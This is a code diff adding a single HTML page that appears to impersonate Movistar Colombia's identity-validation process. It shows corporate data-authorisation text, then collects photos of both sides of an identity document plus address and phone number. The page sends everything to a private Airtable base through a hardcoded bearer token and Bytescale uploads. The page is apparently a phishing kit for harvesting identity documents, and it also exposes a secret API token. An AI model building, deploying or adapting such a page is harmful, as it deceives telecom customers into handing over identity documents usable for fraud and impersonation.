@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+      <link rel="shortcut icon" href="Movistar.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<title>Validación de Titularidad</title>
+<script src="https://js.bytescale.com/upload-widget/v4"></script>
+
+<!-- 🎨 ESTILOS CORPORATIVOS MOVISTAR -->
+<style>
+  body {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    margin: 0;
+    padding: 25px;
+    background: #F4F7FB;
+  }
+
+  h3 {
+    color: #0053A0;
+    margin-top: 0;
+  }
+
+  .hidden {
+    display: none;
+  }
+
+  .box {
+    background: white;
+    padding: 25px;
+    border-radius: 12px;
+    margin-bottom: 25px;
+    border-left: 5px solid #00A9E0;
+    box-shadow: 0 4px 14px rgba(0,0,0,0.08);
+  }
+
+  button {
+    background: #0053A0;
+    color: white;
+    padding: 12px 24px;
+    font-size: 15px;
+    cursor: pointer;
+    border: none;
+    border-radius: 8px;
+    transition: 0.3s;
+    margin-top: 15px;
+  }
+
+  button:hover {
+    background: #00A9E0;
+  }
+
+  /* INPUTS */
+  label {
+    display: block;
+    margin-top: 15px;
+    font-weight: 600;
+    color: #0053A0;
+  }
+
+  input[type="text"] {
+    width: 100%;
+    padding: 10px;
+    margin-top: 6px;
+    border-radius: 8px;
+    border: 1px solid #bfc9d4;
+    font-size: 15px;
+  }
+
+  /* CHECKBOX AL LADO DEL TEXTO */
+  .checkbox-line {
+    display: flex;
+    align-items: center;
+    margin-top: 12px;
+    cursor: pointer;
+  }
+
+  .checkbox-line input {
+    width: auto;
+    margin: 0 10px 0 0;
+    cursor: pointer;
+  }
+
+  /* CUADRO DE BLOQUEO */
+  #locked {
+    background: #e8f6ff;
+    border-left: 5px solid #0053A0;
+  }
+
+/* 🔵 PANTALLA DE CARGA */
+#loader {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: white;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+  transition: opacity 0.6s ease;
+}
+
+/* 🔵 SPINNER CIRCULAR */
+.spinner {
+  width: 80px;
+  height: 80px;
+  border: 8px solid #f3f3f3;       /* fondo del círculo */
+  border-top: 8px solid #00aaff;    /* color del círculo que gira */
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+
+/* ROTACIÓN */
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+/* CUANDO DESAPARECE */
+#loader.hidden {
+  opacity: 0;
+  pointer-events: none;
+}
+
+
+#headerLogo {
+  text-align: center;
+  padding: 20px 0;
+  background: transparent; /* sin fondo sólido */
+  position: relative;
+  z-index: 10;
+}
+
+#headerLogo img {
+  width: 150px;
+  transition: transform 0.4s ease, filter 0.4s ease, box-shadow 0.4s ease;
+  /* sombra sutil para que destaque sobre cualquier fondo */
+  filter: drop-shadow(0 4px 10px rgba(0,0,0,0.2));
+}
+
+#headerLogo img:hover {
+  transform: scale(1.1) rotate(-2deg); /* efecto sutil llamativo */
+  filter: drop-shadow(0 6px 15px rgba(0,0,0,0.3));
+}
+
+
+
+</style>
+</head>
+
+<body>
+
+
+
+<!-- LOADER / PANTALLA DE CARGA -->
+<div id="loader">
+  <div class="spinner"></div>
+</div>
+
+<div id="headerLogo">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/5/55/Movistar_isotype_2020.svg" alt="Movistar">
+</div>
+
+
+
+<div id="locked" class="box hidden">
+  <h3>✔ Validación realizada</h3>
+  <p>En las próximas horas serás contactado por el área técnica.</p>
+</div>
+
+<!-- 1️⃣ AUTORIZACIÓN -->
+<div id="autorizacion" class="box">
+  <h3>Autorización de Tratamiento de Datos</h3>
+  <p style="font-size: 14px;">
+   Autorizo a Colombia Telecomunicaciones S.A. ESP BIC (Av. Suba No.114 A-55 de Bogotá, tel. 091 7050000) a consúltame en centrales de riesgo y recolectar, almacenar, conservar, usar, suprimir, actualizar, compartir y circular a terceros, sus datos personales de orden demográfico, económico, biométricos, de servicios, comercial y de localización; para obtención y suministro de información relativa al cumplimiento de sus obligaciones y el cálculo de riesgo económico o crediticio (de manera irrevocable), la publicación de directorios telefónicos, la prevención y control de fraudes, y para beneficio propio o de terceros con los que Telefónica haya celebrado convenio para envío y recepción de cualquier tipo de información, con fines comerciales o publicitarios en Colombia o en el exterior. La información para el cálculo de riesgo crediticio podrá ser consultada en cualquier operador de banco de datos, por las entidades financieras con las cuales Telefónica celebre convenios comerciales en favor de los titulares. Los datos serán tratados de conformidad con las Políticas para el Tratamiento de Datos Personales que se encuentran a disposición de los interesados y/o titulares de los datos en la página web www.movistar.co Tengo derecho de conocer, actualizar, rectificar, suprimir los datos, y revocar la autorización salvo las excepciones legales. Los datos biométricos son datos sensibles y el titular no está obligado a autorizar su tratamiento, estos serán usados para verificación de identidad y suscripción de contratos.
+  </p>
+
+  <label class="checkbox-line">
+    <input type="checkbox" id="checkAutorizo">
+    <span>Acepto términos y condiciones</span>
+  </label>
+</div>
+
+<!-- 2️⃣ SUBIR DOCUMENTO -->
+<div id="subirDoc" class="box hidden">
+  <h3>Subir Documento de Identidad </h3>
+  <p>Para continuar necesitamos validar tu identidad mediante la presentación de tu documento (POR AMBAS CARAS).
+Este paso es esencial para evitar fraudes, suplantaciones y garantizar que cualquier solicitud o contrato se realice únicamente por su titular.
+Tus datos serán tratados bajo estrictos estándares de seguridad y conforme a las Políticas de Protección de Datos de Movistar – Colombia Telecomunicaciones S.A. ESP BIC.</p>
+
+  <button id="btnSubir">Adjuntar</button>
+</div>
+
+<!-- 3️⃣ FORMULARIO -->
+<div id="formulario" class="box hidden">
+  <h3>Datos de Instalación</h3>
+
+  <label>Ciudad:
+    <input type="text" id="ciudad">
+  </label>
+
+  <label>Dirección:
+    <input type="text" id="direccion">
+  </label>
+
+  <label>Complementos:
+    <input type="text" id="complementos">
+  </label>
+
+  <label>Número de contacto:
+    <input type="text" id="numero">
+  </label>
+
+  <button id="btnEnviar">Finalizar Registro</button>
+</div>
+
+<script>
+
+/* 🔒 BLOQUEO DE FORMULARIO SI YA SE RESPONDIÓ */
+if (localStorage.getItem("registroCompleto") === "1") {
+  document.getElementById("locked").classList.remove("hidden");
+  document.getElementById("autorizacion").classList.add("hidden");
+  document.getElementById("subirDoc").classList.add("hidden");
+  document.getElementById("formulario").classList.add("hidden");
+}
+
+/* ⭐ AQUÍ VA TODO TU JS ORIGINAL SIN NINGÚN CAMBIO */
+
+document.getElementById("checkAutorizo").addEventListener("change", function() {
+  if (this.checked) {
+    document.getElementById("autorizacion").classList.add("hidden");
+    document.getElementById("subirDoc").classList.remove("hidden");
+  }
+});
+
+let archivoPDF_URL = "";
+
+const options = {
+  apiKey: "public_223k2WV2wVDHWGmzL5dydH9jNP9t",
+  maxFileCount: 10,
+  mimeTypes: [
+    "application/pdf",
+    "image/jpeg",
+    "image/png",
+    "image/jpg",
+    "image/heic",
+    "image/heif"]
+};
+
+document.getElementById("btnSubir").addEventListener("click", function() {
+  Bytescale.UploadWidget.open(options).then(
+    files => {
+     if (files.length > 0) {
+
+  // Guardar TODAS las URLs separadas por coma
+  archivoPDF_URL = files.map(f => f.fileUrl).join(",");
+
+  document.getElementById("subirDoc").classList.add("hidden");
+  document.getElementById("formulario").classList.remove("hidden");
+}
+
+    },
+    error => alert("Error al subir archivo: " + error)
+  );
+});
+
+document.getElementById("btnEnviar").addEventListener("click", async function() {
+  const ciudad = document.getElementById("ciudad").value;
+  const direccion = document.getElementById("direccion").value;
+  const complementos = document.getElementById("complementos").value;
+  const numero = document.getElementById("numero").value;
+
+  if (!ciudad || !direccion || !numero) {
+    alert("Por favor completa todos los campos requeridos.");
+    return;
+  }
+
+  try {
+    const respuesta = await fetch("https://api.airtable.com/v0/applsI1T6WPfXQzt5/tbl2qcoDEfd8uNp9F", {
+      method: "POST",
+      headers: {
+        "Authorization": "Bearer patmT7YgoahKfC3ak.7bf73dd977d4938d12f247e35fb5b94e3d40cf78566b0f8b592951c6e4ab1649",
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        records: [
+          {
+            fields: {
+              ciudad: ciudad,
+              direccion: direccion,
+              complementos: complementos,
+              numero: numero,
+              archivo: archivoPDF_URL
+            }
+          }
+        ]
+      })
+    });
+
+    if (!respuesta.ok) {
+      alert("Error al guardar en Airtable.");
+      return;
+    }
+  } catch (e) {
+    alert("Error de conexión con Airtable.");
+    return;
+  }
+
+  localStorage.setItem("registroCompleto", "1");
+
+  alert("Registro completado. En las próximas horas serás contactado por el área técnica.");
+
+  location.reload();
+});
+
+// Ocultar loader cuando la página termine de cargar
+window.addEventListener("load", function() {
+  setTimeout(() => {
+    document.getElementById("loader").classList.add("hidden");
+  }, 1500); // pequeño delay suave
+});
+
+
+</script>
+
+
+
+</body>
+</html>
